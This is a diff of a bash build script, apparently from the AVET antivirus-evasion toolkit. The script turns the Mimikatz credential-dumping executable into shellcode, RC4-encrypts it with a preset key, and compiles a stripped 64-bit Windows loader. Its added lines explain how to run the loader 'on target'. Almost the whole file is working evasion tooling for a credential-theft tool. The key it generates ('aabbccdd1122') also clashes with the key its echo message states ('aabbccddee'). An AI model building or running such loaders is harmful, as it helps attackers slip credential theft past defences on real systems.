@@ -1,4 +1,7 @@
 #!/bin/bash          
+
+
+#DESCRIPTION_START
 # RC4-encrypt the payload with a static, preset key.
 # Here, the mimikatz executable is used as payload, converted into shellcode format by pe_to_shellcode.
 # pe_to_shellcode is written by Hasherezade:
@@ -6,9 +9,7 @@
 
 # This script expects the Mimikatz executable to be at input/mimikatz.exe
 # and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
-
-# Call generated executable on target like:
-# output.exe 'your mimikatz arguments, probably coffee'
+#DESCRIPTION_END
 
 
 # print AVET logo
@@ -22,16 +23,21 @@ cat banner.txt
 # import feature construction interface
 . build/feature_construction.sh
 
-# convert mimikatz executable into shellcode format
-wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
 
+#CONFIGURATION_START
+# enable debug output
+enable_debug_print
 # no command preexec
 set_command_source no_data
 set_command_exec no_command
-
 # generate key file with preset key
 generate_key preset aabbccdd1122 input/key_raw.txt
+#CONFIGURATION_END
 
+
+# convert mimikatz executable into shellcode format
+# Can be of course used with other .exe files
+wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/sc_raw.txt
 # encrypt payload
 encode_payload rc4 input/sc_raw.txt input/sc_enc_raw.txt input/key_raw.txt
 
@@ -54,12 +60,18 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode64
 
-# enable debug output
-enable_debug_print
 
-# compile to output.exe file
-$win64_compiler -o output/output.exe source/avet.c
-strip output/output.exe
+# compile to exe file
+$win64_compiler -o output/rc4enc_mimikatz_win64.exe source/avet.c
+strip output/rc4enc_mimikatz_win64.exe
 
 # cleanup
 cleanup_techniques
+
+
+echo "
+# The decryption key is aabbccddee if it has not been changed.
+# You need to provide the decryption key as 2nd command line argument.
+# Call generated executable on target like:
+# $ rc4enc_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
+"
